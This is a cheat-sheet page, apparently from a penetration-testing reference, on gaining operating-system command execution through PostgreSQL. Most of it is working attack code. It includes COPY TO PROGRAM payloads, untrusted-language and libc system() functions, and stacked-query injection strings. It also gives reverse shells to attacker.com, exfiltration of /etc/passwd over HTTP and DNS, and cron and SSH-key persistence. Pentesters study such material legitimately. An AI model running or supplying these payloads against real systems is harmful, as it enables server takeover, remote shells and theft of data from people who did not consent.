---
title: Command Execution
description: Executing operating system commands through PostgreSQL
category: Advanced Techniques
order: 18
tags: ["command execution", "rce", "copy program"]
lastUpdated: 2025-12-16
---

## Command Execution

PostgreSQL provides several methods to execute operating system commands, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### COPY TO/FROM PROGRAM

The most common method (PostgreSQL 9.3+, requires superuser):

```sql
-- Execute command and capture output
CREATE TABLE cmd_output (output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
DROP TABLE cmd_output;

-- One-liner for command execution
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
```

### Reverse Shell Examples

```sql
-- Bash reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';

-- Python reverse shell
COPY (SELECT '') TO PROGRAM 'python -c ''import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''';

-- Netcat reverse shell
COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker.com 4444';

-- Using mkfifo
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f';
```

### Using Extensions

#### Creating Custom Functions (C Language)

If you can load extensions:

**libc path varies by distribution:**

| Distribution       | Typical libc Path                 |
| ------------------ | --------------------------------- |
| Debian/Ubuntu      | `/lib/x86_64-linux-gnu/libc.so.6` |
| RHEL/CentOS/Fedora | `/lib64/libc.so.6`                |
| Alpine (musl)      | `/lib/ld-musl-x86_64.so.1`        |
| Arch Linux         | `/usr/lib/libc.so.6`              |

**Discovery:** `ldd /bin/ls | grep libc` or `locate libc.so.6`

```sql
-- Create function mapping to libc system()
-- Debian/Ubuntu path shown; adjust for target distribution
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
LANGUAGE C STRICT;

-- RHEL/CentOS alternative:
-- AS '/lib64/libc.so.6', 'system'

-- Execute command
SELECT system('id');
```

**Note:** This technique requires superuser privileges (a restriction in place since PostgreSQL's earliest versions, as C is an untrusted language). Additionally, managed cloud services (AWS RDS, Azure, GCP Cloud SQL) typically don't grant superuser access, and OS-level mechanisms like SELinux or AppArmor may block loading arbitrary shared libraries.

#### Using PL/Python

If `plpython3u` extension is installed:

```sql
-- Create extension (requires superuser)
CREATE EXTENSION plpython3u;

-- Create function to execute commands
CREATE OR REPLACE FUNCTION cmd(cmd TEXT) RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

-- Execute
SELECT cmd('id');
SELECT cmd('whoami');
SELECT cmd('cat /etc/passwd');
```

#### Using PL/Perl

If `plperlu` extension is installed:

```sql
-- Create extension
CREATE EXTENSION plperlu;

-- Create function
CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
my $cmd = shift;
return `$cmd`;
$$ LANGUAGE plperlu;

-- Execute
SELECT cmd('id');
```

#### Using PL/Tcl

```sql
-- Create extension
CREATE EXTENSION pltclu;

-- Create function
CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
return [exec $1]
$$ LANGUAGE pltclu;

-- Execute
SELECT cmd('id');
```

### File Descriptor Hijacking

Using `/dev/tcp` (on systems that support it):

```sql
-- Opens bidirectional TCP connection on fd 5, reads commands from socket,
-- executes each line as shell command, redirects stdout/stderr back to socket
COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done';
```

### Injection Examples (Simplified/Educational)

**⚠️ Disclaimer:** The following payloads are simplified educational examples that assume ideal conditions: no WAF, exact quote/comment context matching the injection point, stacked queries enabled, and no prepared statements. Real-world exploitation requires understanding the specific injection context (string vs numeric, single vs double quotes, comment syntax). See [Operations & Syntax](/postgresql/operations-syntax) for context-aware payload construction.

```sql
-- Basic command execution (assumes string context with single quotes, stacked queries)
'; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--

-- Reverse shell
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'--

-- Using PL/Python (if available)
'; CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpython3u; SELECT exec('id')--

-- Exfiltrate data via DNS
'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'--
```

### Data Exfiltration via Command Execution

```sql
-- Send data over HTTP
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(cat /etc/passwd | base64)';

-- Send data over DNS
COPY (SELECT '') TO PROGRAM 'for line in $(cat /etc/passwd); do nslookup $line.attacker.com; done';

-- Using wget
COPY (SELECT '') TO PROGRAM 'wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect';
```

### Persistence (Limited Practicality)

**⚠️ Warning:** The following techniques require elevated OS privileges beyond what the `postgres` user typically has. Writing to `/etc/cron.d/` requires root; writing to `~/.ssh/authorized_keys` requires access to the target user's home directory. These examples are largely aspirational and only work in misconfigured environments or after additional privilege escalation.

```sql
-- Add cron job (requires root - postgres user cannot write to /etc/cron.d)
COPY (SELECT '') TO PROGRAM 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"" > /tmp/backdoor.cron';
-- Would need: mv /tmp/backdoor.cron /etc/cron.d/ (as root)

-- Add SSH key (only works if postgres user has write access to target's ~/.ssh)
-- tee reads SELECT output from stdin
COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'tee -a ~/.ssh/authorized_keys';
```

### Checking Available Methods

```sql
-- Check for untrusted language extensions
SELECT * FROM pg_extension WHERE extname LIKE 'pl%u';

-- Check PostgreSQL version (COPY PROGRAM requires 9.3+)
SELECT version();

-- Check if superuser
SELECT current_setting('is_superuser');
```

### Notes

- COPY PROGRAM requires superuser privileges
- Commands execute as the `postgres` OS user
- Network access may be restricted by firewalls
- SELinux/AppArmor may prevent command execution
- Modern PostgreSQL restricts loading arbitrary shared libraries
